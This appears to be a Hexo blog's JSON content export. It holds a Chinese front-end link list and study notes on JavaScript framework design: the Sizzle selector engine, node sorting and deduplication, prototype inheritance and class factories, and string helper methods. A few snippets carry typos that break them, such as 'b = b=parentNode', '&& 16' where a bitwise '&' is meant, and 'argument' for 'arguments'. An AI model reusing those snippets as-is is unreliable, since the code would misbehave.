{"meta":{"title":"KING · NOTE","subtitle":"前端·笔记·学习","description":"Loneliness is the carnival of one single soul.","author":"KING","url":"https://github.com/xmoyKING"},"pages":[{"title":"知识点/连接合集","date":"2017-01-01T08:42:15.000Z","updated":"2017-12-12T15:05:27.609Z","comments":true,"path":"about/links.html","permalink":"https://github.com/xmoyKING/about/links.html","excerpt":"","text":"前端资源w3cplus 成为专业程序员路上用到的各种优秀资料、神器及框架 推荐前端技术书- 伯乐在线 前端知识点大百科全书 前端开发者手册 前端实习生面试总结 前端面试经典题目合集介绍- 牛客网 Web前端面试题目汇总 JavaScript 全栈工程师培训教程- 阮一峰 你可能不知道的10个设计神器（内附使用教程） 前端入门及学习路线，分两部分，一个是HTML和CSS基础，一个是Javascript。由于是译文，资源和链接都是英文的: 前端开发，从草根到英雄（第一部分） 前端开发，从草根到英雄（第二部分） httpbin(1): HTTP Request &amp; Response Service 免费可以用来测试的http请求、响应服务 移动web资源整理 Alloyteam：移动web问题小结 收藏指数满格！帮你打包前端之巅一整年好文！前端之巅公众号文章很多都是精华啊！ JS函数式编程初略过一遍，了解思想即可，这是一种编程范式，讲解虽然由浅入深，但由于思想问题，接收程度不一，所以习惯了传统js编程的人感觉有些别扭，综合而言：运用在实际开发中或想要掌握需多练习 友链/博客ZhangShu @何海宝 林散知识点css position 初解10步 dom操作元素 两列布局 去除inline-block元素间间距的N种方法 « 张鑫旭-鑫空间-鑫生活 事件代理 &amp; 什么是冒泡什么是捕获 javascript中0级DOM和2级DOM事件模型浅析 BFC，haslayout是什么，怎么触发 关于Block Formatting Context－－BFC和IE的hasLayout CSS魔法堂：重新认识Box Model、IFC、BFC和Collapsing margins jQuery取到的元素和原生Js取到的元素有什么区别 / 原生 JS 代码和用 jQuery 实现效果各有什么优劣势？ css3动画的性能优化 CSS 性能优化笔记 内含其他性能优化链接 前端优化带来的思考，浅谈前端工程化 前端性能优化—-yahoo前端性能团队总结的35条黄金定律 Javascript模块化编程(一):模块的写法 - 阮一峰的网络日志 后面还有2（CommonJS规范）和3（require.js库使用），都需要看 JavaScript内存泄露的4种方式及如何避免常见的客户端 JavaScript 内存泄露，以及如何使用 Chrome 开发工具发现问题 js晋级篇——前端内存泄漏探讨 标记清除和引用计数 JS核心系列：理解 new 的运行机制 [译]JavaScript: proto js中proto和prototype的区别和关系？ clearfix清除浮动进化史 使用 CSS3 实现超炫的 Loading（加载）动画效果 css3(border-radius)边框圆角详解 Ajax知识体系大梳理非常全，而且讲到浏览器四种线程之间的配合AJAX工作原理及其优缺点简版 浓缩解读《JavaScript设计模式与开发实践》①主要讲的是一些js的基本内容，他的笔记共3章，KING自己对书中内容进行了整理和搬运 主要讲设计模式的用途，以及原型继承的各方面特性 主要讲this、call和apply 主要讲闭包和高阶函数，包括命令模式，AOP，函数柯里化（这里代码有错误）。 一次完整的HTTP请求过程（以chrome为例）其中有谈到计算机网络，操作系统文件管理，浏览器渲染参考 用纯CSS实现的箭头 详解JS原型链与继承 面试开发常用的 JavaScript 知识点总结 基于webpack的前端工程化方案（纯静态页面） HTTPS 为什么更安全 说说JSON和JSONP，也许你会豁然开朗，含jQuery用例 BAT及各大互联网公司2014前端笔试面试题–JavaScript篇博主还有很多优秀博文值得学习 CSS background 属性 JS魔法堂：函数节流（throttle）与函数去抖（debounce） margin系列看完才知道从前的自己对margin一无所知，由于博主链接的个人博客地址挂掉了，所以图片和外链无法访问，有机会帮忙重新复写一遍 :after和:before炫酷用法总结最后给出的一些demo链接很有价值，尤其是链向tympanus.net的demo,最后引发了如下讲解CSS Counter的博文 CSS Counters CSS Animations VS the Web Animations API：案例学习 简编漫画介绍WebAssembly目前浏览器实现和普及还待观望 浏览器同源政策及其规避方法主要学习如何规避，或者说如何解决跨域问题，无论是JSONP或是CORS，都是需要服务器配合的 如何绕过chrome的弹窗拦截机制 关于网站图标favicon.ico那点事儿，你造吗？ 关于CSS的will-change属性的介绍 多行文本溢出显示省略号(…)全攻略 自定义浏览器滚动条的样式，打造属于你的滚动条风格 JavaScript 编码规范 简述 OAuth 2.0 的运作流程 request payload到底是什么东西？为何java后端收不到请求参数 如何优雅的选择字体(font-family) 半深入理解CSS3 object-position/object-fit属性 ES6ECMAScript 6 入门 前端开发者必不得不知的ES6十大特性10种特性的简短介绍和使用方式 promise JavaScript Promise迷你书（中文版） nodejs从零开始nodejs系列文章 Nodejs中文社区资料 Nodejs官方文档(英文 Nodejs与mysql实现增删改查示例1 Nodejs与mysql实现增删改查示例2 10个常见的Node.js面试题 node.js面试题大全－侧重后端应用与对Node核心的理解 node.js的总结-可以应付bat的社招面试 Node.js 的面试题是怎么样的？ 深入理解 Express.js forever让nodejs应用后台应用 JS题目do you really know JavaScript?:JavaScript Puzzlers! 解析:44个 Javascript 变态题解析 [“1”, “2”, “3”].map(parseInt) 的输出为other，解析 使用jquery获取url及url参数的方法 vscode: Visual Studio Code 常用快捷键 一灯学堂学习路径 PythonPython3入门-by廖雪峰非常非常适合入门 设计、模版设计导航 FWA罗列顶尖交互和视觉效果网站及APP 微信小程序设计指南现在APP界面风格趋势大都趋近于简约风，而国内APP中，微信的UI设计得就挺不错，这段时间看了下微信小程序，发现可以从微信小程序设计指南学习一些通用的移动端UI设计规范。 总原则：功能确定-》元素少-》体验统一-》界面美观"},{"title":"About KING","date":"2017-01-20T13:31:03.000Z","updated":"2017-12-06T14:50:09.555Z","comments":true,"path":"about/index.html","permalink":"https://github.com/xmoyKING/about/index.html","excerpt":"","text":"My nickname is KING, it’s from KING OF POP —— Michael Jackson. and the avatar (the plain Lion) you saw is one of my favorite picture. and I am a postgraduate student at SSE.USTC now. I like IT, especially Web related technologies. Resume:简历-单页-2017.4.pdf 简历-多页-2017.4.pdf"},{"title":"Tags","date":"2017-12-26T08:18:53.562Z","updated":"2017-12-06T14:50:09.586Z","comments":true,"path":"tags/index.html","permalink":"https://github.com/xmoyKING/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"JavaScript框架设计笔记-5-Sizzle引擎","slug":"js-framework5","date":"2017-12-26T10:57:46.000Z","updated":"2017-12-26T10:57:46.000Z","comments":true,"path":"2017/12/26/js-framework5/","link":"","permalink":"https://github.com/xmoyKING/2017/12/26/js-framework5/","excerpt":"","text":"jQuery最大的特点就是其选择器，jQuery从1.3开始使用Sizzle引擎。其与其他的选择器引擎（当时也没什么选择器引擎）相比，速度非常快。 Sizzle在当时的几大特点： 允许以关系选择器开头 允许取反选择器嵌套 大量自定义伪类，比如:eq :first :even :contains :has :radio :input :text :file :hidden :visible等 对结果去重，以元素在DOM树的位置进行排序，这样与querySelector行为一致 到jQuery/Sizzle1.8时，其开始走编译函数的风格，正则通过编译得到，更加准确，结构也更加复杂，同时通过多种缓存手段提高查找速度和匹配速度。 在Sizzle1.7.2中，其整体结构如下： Sizzle主函数，里面包含选择符的切割，内部循环调用主查找函数，主过滤函数，最后时去重过滤 其他辅助函数，如uniqueSort,matches,matchesSelector Sizzle.find主查找函数 Sizzle.filter主过滤函数 Sizzle.selectors包含各种匹配用的正则，过滤用的正则，分解用的正则，预处理函数，过滤函数 根据浏览器特征设计makeArray，sortOrder，contains等方法 根据浏览器特征重写Sizzle.selctors中的部分查找函数，过滤函数，查找次序 若浏览器支持querySelectorAll，那么用它重写Sizzle，将原来的Sizzle作为后备包裹在新Sizzle里 其他辅助函数，如isXML，posProcess","categories":[{"name":"js","slug":"js","permalink":"https://github.com/xmoyKING/categories/js/"}],"tags":[{"name":"js","slug":"js","permalink":"https://github.com/xmoyKING/tags/js/"},{"name":"js-framework","slug":"js-framework","permalink":"https://github.com/xmoyKING/tags/js-framework/"},{"name":"sizzle","slug":"sizzle","permalink":"https://github.com/xmoyKING/tags/sizzle/"}]},{"title":"JavaScript框架设计笔记-4-选择器引擎","slug":"js-framework4","date":"2017-12-21T12:04:03.000Z","updated":"2017-12-21T12:04:03.000Z","comments":true,"path":"2017/12/21/js-framework4/","link":"","permalink":"https://github.com/xmoyKING/2017/12/21/js-framework4/","excerpt":"","text":"学习如何从头到尾制造一个选择器引擎，同时围观一下前人大神的努力。 getElementsBySelector，最古老的选择器引擎，它规定了今后许多选择器的发展方向。源码实现的思想就是利用正则切割css选择器，支持#aa p.bb [cc==dd]的形式，但CSS选择器不能超过两种，且其中一种为标签。 选择器引擎涉及的知识点主要时学习一些概念和术语，有关选择器引擎实现的概念大多时从Sizzle中抽取出来的，而CSS表达符部分则从W3C可以找到。1h2 &#123; color: red; font-size: 14px; &#125; 上面的CSS样式规则中，h2为选择符，color:red;和font-size: 14px;为声明，color和font-size为属性，冒号后面的red和14px为值。 一般来说，选择符非常复杂，会混杂大量标记，能分割为许多更细的单元，不包括无法操作的伪元素的话，大致分为4大类17种。 4大类： 并联选择器：逗号,，一种不是选择器的选择器，用于合并多个分组的结果 简单选择器：ID、标签、类、属性、通配符 关系选择器：亲子、后代、相邻、兄长 伪类：动作、目标、语言、状态、结构、取反 其中简单选择器又称为基本选择器，通过/isTag = !/\\W/.test(part)就可以进行判断（jQuery的方法），原生API也有很多支持，比如getElementById，getElementsByTagName,getElementsByClassName, document.all, 属性选择器用getAttribute，getAttributeNode，attributes、hasAttribute等。 伪类伪类选择器中最庞大的家族，从CSS1开始支持，以字符串开头，在CSS3出现了传参的结构伪类与取反伪类。动作伪类动作伪类又分为链接伪类和用户伪类，其中链接伪类由:visited和:link组成，用户行为伪类由:hover、:active和:focus组成。其中:link是指代a, area, link三种标签。 目标伪类即:target伪类，指其id或者name属性与url中的hash部分匹配上的元素。比如一个元素id为section_2, 而url中hash部分是#section_2，那么它就是目标元素。 Sizzle中的过滤函数如下：1234\"target\": function(elem)&#123; var hash = window.location &amp;&amp; window.location.hash; return hash &amp;&amp; hash.slice(1) === elem.id;&#125; 语言伪类即:lang伪类，用来设置特殊语言的内容样式，如:lang(de)的内容应该为德语，需要特殊处理。 作为DOM元素的一个属性，[lang=de]只能选到目标元素，但:lang伪类具有继承性，伪类:lang(de)能包括其子元素。 状态伪类状态伪类用于标记一个UI元素的当前状态，由:checked, :enabled, :disabled, :indeterminate这4种组成，可以通过元素的checked、disabled、indeterminate属性进行判定。 结构伪类细分为3类，伪根类，子元素过滤伪类，空伪类，根伪类由它在文档的位置判定，子元素过滤伪类是根据它在其父类的所有孩子的位置或标签类型判定，空伪类是根据它孩子的个数判定。 :root伪类选取根元素，在HTML中通常是html元素:nth-child是所有子元素过滤伪类的蓝本，其他8种都是由其衍生而来。它能带参数，可以是纯数字，代数式或单词，若是纯数字，则从1起，若是代数式，n从0递增。:only-child用于选择唯一的子元素:empty用于选择那些不包括任何元素节点、文本节点、CDATA节点的元素，但可以包含注释节点 取反伪类即:not伪类，其参数为一或多个简单选择器，用逗号隔开，jQuery甚至允许传入其他类型的选择器，包括多个取反伪类嵌套。 引擎在实现时设计的概念种子集：或者叫候选集，若CSS选择符非常复杂，需要分几步才能得到需要的元素，那么第一次得到的元素集合就是种子集，若选择器引擎从左到右选取，那么就需要继续查找它们的孩子或兄弟节点，Sizzle从右到左（大体方向，实际上很复杂），它的种子集有一部分为最后得到的元素。 结果集：引擎最终返回的元素集合，一般保持与querySelectorAll一致，即没有重复元素，元素按照它们在DOM树中出现的顺序排序。 过滤集：选取一组元素后，它之后的每一个步骤要处理的元素集合都可以叫过滤集，比如p.aaa,若浏览器不支持querySelectorAll，Sizzle会以ID、Class、Tag的顺序进行查找。 选择器群组：一个选择符被并联选择器,划分成每一个大分组 选择器组：一个选择器群组被关系选择器划分的第一个小分组 选择器也分为编译型和非编译型，编译型是EXT发明的，有EXT、QWrap、NWMatchers、JindoJS等，非编译型（支持XML元素）非常多，如Sizzle、Slick、Icarus、YUI、dojo…。 还有一种利用xpath实现的选择器，Base2就是，先实现xpath语法，然后将CSS选择符翻译为xpath。 选择器引擎涉及的通用函数isXML强大的选择器引擎都提供了XML操作的API，XML和HTML其实存在很大差异，有没有className，getElementById，nodeName大小写敏感等。 无论是XML或HTML文档都支持createElement方法，但HTML对大小写不敏感，因此方法如下：123var isXML = function(doc)&#123; return doc.createElement('p').nodeName !== doc.createElement('P').nodeName;&#125; 通过一些XML的专有方法或属性也可以判断，但会比较麻烦，而属性法很容易就被攻破。 containscontains方法就是判断参数1是否包含参数2，通常用于优化。12345678910111213141516171819contains = function(a, b, same)&#123; // 第一个节点是否包含第二个节点，same表示允许相等 if(a === b)&#123; return !!same; &#125; if(!b.parentNode)&#123; return false; &#125; if(a.contains)&#123; return a.contains(b); &#125;else if(a.compareDocumentPosition)&#123; return !!(a.compareDocumentPosition(b) &amp;&amp; 16); &#125; while((b = b=parentNode)) if(a === b) return true; return false;&#125; 其中contains是一个元素节点的方法，若另一个节点等于或包含于它的内部，就返回true。compareDocumentPosition这个API是DOM3添加的，用于判断两个节点的关系，而不单单有包含关系，返回一个数用于表示节点关系. 具体可参考：HTML DOM compareDocumentPosition() 方法 注：两个元素的位置关系可连续满足多种情况，比如A包含B，且A在B的前面，结果就是20. 节点排序与去重为了让选择器引擎搜索到的结果尽可能接近原生API的结果（querySelectorAll），需要让元素节点按照它们在DOM树出现的顺序排序。 通过compareDocumentPosition()方法，只要将结果按位与4不等于0就知道其前后顺序了。同时标准浏览器的Range对象有一个compareBoundaryPoints方法，它能迅速得到两个元素的前后顺序。var compare = compareRange.compareBoundaryPoints(how, sourceRange) 具体可参考：XML DOM compareBoundaryPoints() 方法 特别的情况：当一些旧版本浏览器只有很基础的DOM API时，只能用nextSibling来判断单纯前后关系，若没有同一个父节点则就变成求最近公共祖先节点，此时就变为纯算法问题。 排序去重的提升关键在于，很多算法都会用到数组的sort方法，当传入一个比较函数时，无论内部是采用何种排序算法，都需要多次对比，所以耗时，若能让排序不传参，即使用默认无参的sort函数，则能提高N倍的排序速度。 思想如下（用于IE或不兼容浏览器）： 取出元素节点的souceIndex值，转换成一个String对象 将元素节点附在String对象上 用String对象组成数组 用原生的sort对String对象数组排序 在排好序的String数组中，按序取出元素节点，即可得到排好序的结果集 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061function unique(nodes)&#123; if(nodes.length &lt; 2)&#123; return nodes; &#125; var result = [], array = [], uniqResult = &#123;&#125;, node = nodes[0], index, ri = 0, sourceIndex = typeof node.sourceIndex === 'number', compare = typeof node.compareDocumentPosition === 'function'; if(!sourceIndex &amp;&amp; !compare)&#123; // 用于旧版IE的XML var all = (node.ownerDocument || node).getElementsByTagName('*'); for(var index = 0; node = all[index]; index++)&#123; node.setAttribute('sourceIndex', index); &#125; sourceIndex = true; &#125; if(sourceIndex)&#123; for(var i = 0, n = nodes.length; i &lt; n; i++)&#123; node = nodes[i]; index = (node.sourceIndex || node.getAttribute('sourceIndex')) + 1e8; if(!uniqResult[index])&#123; // 去重 (array[ri++] = new String(index))._ = node; uniqResult[index] = 1; &#125; &#125; array.sort(); // 排序 while(ri) result[--ri] = array[ri]._; return result; &#125;else&#123; nodes.sort(sortOrder); // 排序 if(sortOrder.hasDuplicate)&#123; // 去重 for(i = 1; i &lt; nodes.length; i++)&#123; if(nodes[i] === nodes[i-1])&#123; nodes.splice(i--, 1); &#125; &#125; &#125; sortOrder.hasDuplicate = false; // 还原 return nodes; &#125;&#125;function sortOrder(a,b)&#123; if(a === b)&#123; sortOrder.hasDuplicate = true; return 0; &#125; if(!a.compareDocumentPosition || !b.compareDocumentPosition)&#123; return a.compareDocumentPosition ? -1 : 1; &#125; return a.compareDocumentPosition(b) &amp; 4 ? -1 : 1; &#125;","categories":[{"name":"js","slug":"js","permalink":"https://github.com/xmoyKING/categories/js/"}],"tags":[{"name":"js","slug":"js","permalink":"https://github.com/xmoyKING/tags/js/"},{"name":"js-framework","slug":"js-framework","permalink":"https://github.com/xmoyKING/tags/js-framework/"}]},{"title":"JavaScript框架设计笔记-3-类工厂","slug":"js-framework3","date":"2017-12-18T09:25:38.000Z","updated":"2017-12-18T09:25:38.000Z","comments":true,"path":"2017/12/18/js-framework3/","link":"","permalink":"https://github.com/xmoyKING/2017/12/18/js-framework3/","excerpt":"","text":"直到ES6之前，JS没有真正传统的类，但可以模拟实现，所以类工厂是很多框架的标配，本篇主要学习各种类的实现。（PS:其实ES6中的class是一个语法糖，看着像传统的类而已，本质没变过，- -。） JS对类的支持传统OO语言中，类的实例都通过构造函数new出来，JS存在new操作符，并且它的所有函数都作可以为构造器。 JS从其他语言借鉴了原型机制，prototype作为一个特殊的对象属性存在每一个函数上，当一个函数通过new操作符“创建”出“实例”，这个实例对象就拥有了这个函数的prototype对象所有一切成员，从而实现所有实例对象都共享一组方法或属性。JS的类通过修改这个prototype对象，以区别原生对象及其他自定义“类”。比如在浏览器中，Node类基于Object修改而来，而Element则基于Node，HTMLElement基于Element…. 一般创建自己的类实现重用和共享：123456789101112function A()&#123;&#125; // 外观上，构造器和普通函数没有什么区别。习惯上大写首字母A.prototype = &#123; aa: 'aa', // 原型属性 method: function()&#123;&#125; // 原型方法&#125;;var a = new A; // 创建实例avar b = new A; // 创建实例bconsole.log(a.aa === b.aa); // trueconsole.log(a.method === b.method); // true 一般把定义在原型上的成员（方法/属性）叫原型成员，它为所有实例所共享。直接在构造器（通过this指定或直接var声明）内指定的方法叫特权成员，这些特权成员每一个实例一个副本，不会相互影响，因此通常把共享的用于操作数据的方法放在原型，把私有数据放在特权属性中。但若放在this上，则实例可在任何时候直接访问，当放在函数体内的作用域而不是this上时，就变成了私有属性（通过实例也无法访问，只有通过实例的方法能访问）。 123456789101112131415161718192021function A()&#123; var count = 0; // 私有属性 this.aa = 'aa'; // 特权属性 this.method = function()&#123; return count; &#125;; // 特权方法 this.obj = &#123;&#125;; // 特权属性&#125;A.prototype = &#123; aa: 'aa', method: function()&#123;&#125;&#125;;var a = new A;var b = new A;console.log(a.aa === b.aa); // true， 由于aa的值为基本类型，所以比较的是原始值，但其实有不同的内存地址console.log(a.obj === b.obj); // false 由于obj的值为引用类型，所以比较的是内存地址，可以看出是不同的对象console.log(a.method === b.method); // false，函数其实也是特殊的对象，同引用类型的规则delete a.method;console.log(a.method === A.prototype.method); // true 上例中的特权成员将同名的原型成员遮盖了，若将这些特权的成员删除，就又能访问原型成员了。 在Java中，原型方法与特权方法都被归为实例方法（即通过实例访问的，而不是通过类访问的），在Java中，还有一种类成员的东西，是通过类访问的，实例无法访问。JS中模拟则直接在类上定义即可：12345A.method2 = function()&#123; console.log('A.method2') &#125;; // 模拟Java的类方法var c = new A;console.log(c.method2); // undefinedA.method2(); // A.method2 继承的实现：即，只要prototype有啥，实例就有啥，无论这个成员是什么时候添加的。而若将prototype对象赋值为另一个类的原型（prototype），那么就能将另一个类的所有原型成员“偷”（或者叫“继承”）过来。12345678910111213function A()&#123;&#125;A.prototype = &#123; aaa: 1&#125;function B()&#123;&#125;B.prototype = A.prototype;var b = new B;console.log(b.aaa); // 1A.prototype.bbb = 2;console.log(b.bbb); // 2 由于prototype引用的是相同对象，所以修改A类的原型（prototype属性），也等同于修改了B类的原型。而传统的继承却不是这样的，修改子类的原型不应该影响到父类原型，因此最好不要将一个原型对象赋给两个类。方法一，通过for in把父类的原型成员逐一赋给子类的原型（简单粗暴，直接添加/覆盖到子类原型）；方法二，子类的原型不是直接指向父类原型，而是先将此父类的原型赋给一个函数的原型，然后将这个函数的实例作为子类的原型（这样通过这个实例可以获取父类的原型成员，而且可以一直追溯到Object）。 方法一，通常是先自定义一个mixin(也叫extend)方法，该方法很简单，就是将一个对象中所有的属性都copy到另一个对象中，但问题是无法使用instanceof操作符获取是否是某类的实例的判断了（对传统继承而言，是否是某类的实例是非常重要的，许多设计模式或者判断需要依据类实例判断结果）。1234567// 使用时，传入的都是原型，将source中的成员都添加到destination，但会覆盖同名成员function extend(destination, source)&#123; for(var property in source)&#123; destination[property] = source[property]; &#125; return destination;&#125; 方法二，被称为原型继承的经典方法。1234567891011121314151617181920212223242526272829303132function A()&#123;&#125;A.prototype = &#123; aa: function()&#123; alert(1) &#125;, aaa: 1&#125;function bridge()&#123;&#125;bridge.prototype = A.prototype;function B()&#123;&#125;B.prototype = new bridge; // 此处的new bridge操作得到了一个实例，// 通过该实例能访问父类的原型成员，因为该实例的类的原型就是父类原型，// 而在子类原型（其实是一个父类原型的实例）上添加新成员// PS: 此处其实还有一个B.prototype.constructor的指向问题// 实例的constructor（其实是创建一个函数的时候就自动添加到原型上的）指向其构造器// 可参考：[深入分析js中的constructor 和prototype](https://www.cnblogs.com/yupeng/archive/2012/04/06/2435386.html)var a = new A;var b = new B;console.log(A.prototype == B.prototype); // false,说明子类和父类的原型对象不是同一个对象了，成功分离console.log(a.aa === b.aa); // true,子类共享父类的原型方法A.prototype.bb = function()&#123; alert(2) &#125; // 为父类动态添加原型方法console.log(a.bb === b.bb); // true,子类总会共享父类的原型成员B.prototype.cc = function()&#123; alert(3) &#125; // 为子类动态添加原型方法console.log(a.cc === b.cc); // false,父类不会获取到子类修改后的原型成员// instanceof操作符能正确检测是否是实例console.log(b instanceof A); // trueconsole.log(b instanceof B); // true 以上的实现方式其实在ES5中已经内置了，即Object.create方法。其原理类似上面的方法二，实现如下（排除第二个参数后的实现）：123456789// 传入的o是一个原型对象（其实也可以是任意普通的对象）// 返回子类的原型Object.create = function(o)&#123; function F()&#123;&#125; // 相当于bridge函数， F.prototype = o; return new F();&#125;B.prototype = Object.create(A.prototype); // 如此即可指定B的原型为A的原型的一个实例，即B继承A 但上面的方法二遗漏了一些东西，当父类有类成员和特权成员时，由于不是定义在父类原型中的，所以方法二的子类原型无法获取到，但传统的类中，子类其实是可以获取到父类的特权成员的（私有成员无法获取）。 在JS中的原型继承没有让子类获取到父类的类成员和特权成员，只能手动添加，这样就需要用到上面的方法一了，特权成员可以在子类的构造器中通过apply实现（即绑定this到父类上）。1234567891011121314151617181920// function inherit(init, Parent, proto)&#123; // 声明一个构造器，即真正的子类 function Son()&#123; Parent.apply(this, argument); // 先继承父类的特权成员 init.apply(this, argument); // 再执行自己的构造器 &#125; // 由于Object.create可能不是原生的，因此避免使用第二个参数,而是用一个空对象代替 Son.prototype = Object.create(Parent.prototype, &#123;&#125;); // IE下子类无法自动通过父类原型实例获取到父类的toString和valueOf方法 Son.prototype.toString = Parent.prototype.toString; Son.prototype.valueOf = Parent.prototype.valueOf; Son.prototype.constructor = Son; // 此处确保构造器的正确指向，而不是Object， extend(Son.prototype, proto); // 向子类添加自定义的原型成员 extend(Son, Parent); // 向子类添加父类的类成员 return Son; // 最后返回子类&#125; 当访问实例的一个属性时，先找其特权成员，有则返回，没有就找原型，再没有则找父类的原型，直到Object，这就是实例的属性查找机制（即回溯机制） 对属性查找机制的测试如下：1234567891011121314151617181920function A()&#123;&#125;A.prototype = &#123; aa: function()&#123; console.log(1) &#125;&#125;var a = new A;console.log(a.aa); // ƒ ()&#123; console.log(1) &#125; 即 function()&#123; console.log(1) &#125;// 将A的整个原型换掉A.prototype = &#123;aa: 2&#125;;console.log(a.aa); // 不影响，还是ƒ ()&#123; console.log(1) &#125;// 测试是否能被constructor修改function B()&#123;&#125;B.prototype = &#123; aa: 3&#125;a.constructor = B; console.log(a.aa); // 不影响 上述的测试可以发现，无论修改类原型还是实例的constructor属性，都无法影响到实例查找某个原型上的属性，即回溯查找机制不是通过上面的prototype和constructor属性实现的。 ECMA规定每一个对象都有一个内部属性[[Prototype]]，它保存着当new该对象时构造器所引用的prototype指向，在浏览器中对象有一个属性__proto__可以访问这个内部属性，而这个属性就是回溯机制的关键，只要不动__proto__，实例的属性查找永远不会改变。 使用new操作符时发生的操作如下： 创建一个空对象instance instance.__proto__ = instanceClass.prototype 设置构造器函数里的this = instance 执行构造器函数中的代码 判断是否有返回值，没有返回值默认为undefined，有引用类型的返回值则返回该引用，否则返回this 验证如下：12345678910111213141516function A()&#123; console.log(this.__proto__.aa); // 1 this.aa = 2&#125;A.prototype = &#123; aa: 1&#125;var a = new A;console.log(a.aa); // 2a.__proto__ = &#123; aa: 3&#125;delete a.aa; // 删除特权属性，暴露原型链上的同名属性console.log(a.aa); // 3 有了__proto__属性句可以将原型继承变得简洁：1234567891011121314function A()&#123;&#125;A.prototype = &#123; aa: 1&#125;function B()&#123;&#125;B.prototype.__proto__ = A.prototype;var b = new B;console.log(b.aa); // 1console.log(b.constructor); // ƒ B()&#123;&#125; 即 function B()&#123;&#125;console.log(b instanceof A); // trueconsole.log(b instanceof B); // trueconsole.log(b.__proto__ === B.prototype); // true 相当于做了如下操作：12345678910111213141516function A()&#123;&#125;A.prototype = &#123; aa: 1&#125;function bridge()&#123;&#125;bridge.prototype = A.prototype;function B()&#123;&#125;B.prototype = new bridge;B.prototype.constructor = B;var b = new B;B.prototype.cc = function()&#123; alert(3); &#125;;console.log(b.__proto__ === B.prototype); // trueconsole.log(b.__proto__.__proto__ === A.prototype); // true 父类的原型对象 因为b.__proto__.constructor指向B,而B的原型（B.prototype）是从bridge中得到的（是bridge的一个实例），而bridge.prototype = A.prototype。反过来，在定义时，让B.prototype.__proto__ = A.prototype就能轻松实现原型继承了。 各种类工厂的实现由于主流框架类工厂的实现太依赖于各种庞杂的工具函数，而一个精巧的类工厂不过百行左右，只要传入相应的参数或按一定简单格式就能创建一个类。 P.jshttps://github.com/jneen/pjs 在调用父类的同名方法时，直接将父类的原型给出，省了_super的过程。 JS.Classhttps://github.com/dkraczkowski/js.class 通过父类构造器的extend方法来产生自己的子类，里面存在一个开关，防止在生成类时无意执行construct方法。 在创建子类时，不通过中间的函数来断开双方的原型链，而是使用父类的实例来做子类的原型。 simple-inheritancehttps://github.com/html5crew/simple-inheritance 特点是方法链的实现非常优雅，节俭！ def.jshttps://github.com/tobytailor/def.js 体现JS的灵活性，在形式上模拟Ruby继承，让学过Ruby的人一眼看出哪个是父类，哪个是子类。 ES5属性描述符对OO库的影响ES5中为对象引入属性描述符，能对属性进行更精细的控制，比如，属性是否可以修改，是否可以在for in循环中枚举出来，是否可以删除等。 Object提供的新方法如下： Object.keys Object.getOwnPropertyNames Object.getPrototypeOf Object.defineProperty Object.defineProperties Object.getOwnPropertyDescriptor Object.create Object.seal Object.freeze Object.preventExtensions Object.isSealed Object.isFrozen Object.isExtensible 关于如上方法的介绍和基本用法：MDN/Object Object.create让原型继承更方便了，但在增加子类的专有原型成员或类成员时，若它们的属性的enumerable为false，单纯的for in循环已经不管用了，就需要用到Object.getOwnPropertyNames, 另外，访问器属性的复制只有通过Object.getOwnPropertyDescriptor和Object.defineProperty才能完成。","categories":[{"name":"js","slug":"js","permalink":"https://github.com/xmoyKING/categories/js/"}],"tags":[{"name":"js","slug":"js","permalink":"https://github.com/xmoyKING/tags/js/"},{"name":"js-framework","slug":"js-framework","permalink":"https://github.com/xmoyKING/tags/js-framework/"}]},{"title":"JavaScript框架设计笔记-2-语言模块","slug":"js-framework2","date":"2017-12-17T09:52:05.000Z","updated":"2017-12-17T09:52:05.000Z","comments":true,"path":"2017/12/17/js-framework2/","link":"","permalink":"https://github.com/xmoyKING/2017/12/17/js-framework2/","excerpt":"","text":"浏览器提供的原生API总是不够的，因此各个框架都创造了许多方法来弥补这缺陷。这就是语言模块的来源，即添加许多对字符串、数组、函数…的方法来修复或增强语言的能力。主要介绍了一些非常底层的知识点，让我们更熟悉这门语言。 字符串的扩展与修复脚本语言都对字符串特别关注，有关它的方法特别多。wbr来自Tangram，用于软换行， contains 方法：判定一个字符串是否包含另一个字符串。常规思维是使用正则表达式。但每次都要用new RegExp来构造，性能太差，转而使用原生字符串方法，如indexOf、lastIndexOf、search。1234function contains(target, it) &#123; //indexOf改成search，lastIndexOf也行得通 return target.indexOf(it) != -1; &#125; startsWith方法：判定目标字符串是否位于原字符串的开始之处，可以说是contains方法的变种。endsWith方法：与startsWith方法相反。12345678910111213//最后一个参数是忽略大小写function startsWith(target, str, ignorecase) &#123; var start_str = target.substr(0, str.length); return ignorecase ? start_str.toLowerCase() === str.toLowerCase() : start_str === str;&#125;//最后一个参数是忽略大小写function endsWith(target, str, ignorecase) &#123; var end_str = target.substring(target.length - str.length); return ignorecase ? end_str.toLowerCase() === str.toLowerCase() : end_str === str;&#125; repeat方法：将一个字符串重复自身N次，如repeat（”ruby”, 2）得到rubyruby。其中有很多方法（具体实现就不写了，给出思想）：版本1：利用空数组的join方法。版本2：版本1的改良版。创建一个对象，使其拥有length属性，然后利用call方法去调用数组原型的join方法，省去创建数组这一步，性能大为提高。重复次数越多，两者对比越明显。另外，之所以要创建一个带length属性的对象，是因为要调用数组的原型方法，需要指定call的第一个参数为类数组对象，而类数组对象的必要条件是其length属性的值为非负整数。版本3：版本2的改良版。利用闭包将类数组对象与数组原型的join方法缓存起来，避免每次都重复创建与寻找方法。版本 4：从算法上着手，使用二分法，比如我们将ruby重复5次，其实我们在第二次已得到rubyruby，那么第3次直接用rubyruby进行操作，而不是用ruby。版本5：版本4的变种，免去创建数组与使用jion方法。它的短处在于它在循环中创建的字符串比要求的还长，需要回减一下。版本6：版本4的改良版。版本7：与版本6相近。不过在浏览器下递归好像都做了优化（包括IE6），与其他版本相比，属于上乘方案之一。版本8：通过用数组concat方法，使用递归的方式，可以说是一个反例，很慢，不过实际上它还是可行的，因为实际上没有人将n设成上百成千。 版本6在各浏览器的得分是最高的：123456789101112function repeat(target, n) &#123; var s = target, total = \"\"; while (n &gt; 0) &#123; if (n % 2 == 1) total += s; if (n == 1) break; s += s; n = n &gt;&gt; 1; &#125; return total;&#125; byteLen方法：取得一个字符串所有字节的长度。这是一个后端过来的方法，如果将一个英文字符插入数据库char、varchar、text类型的字段时占用一个字节，而将一个中文字符插入时占用两个字节。为了避免插入溢出，就需要事先判断字符串的字节长度。在前端，如果我们要用户填写文本，限制字节上的长短，比如发短信，也要用到此方法。随着浏览器普及对二进制的操作，该方法也越来越常用。 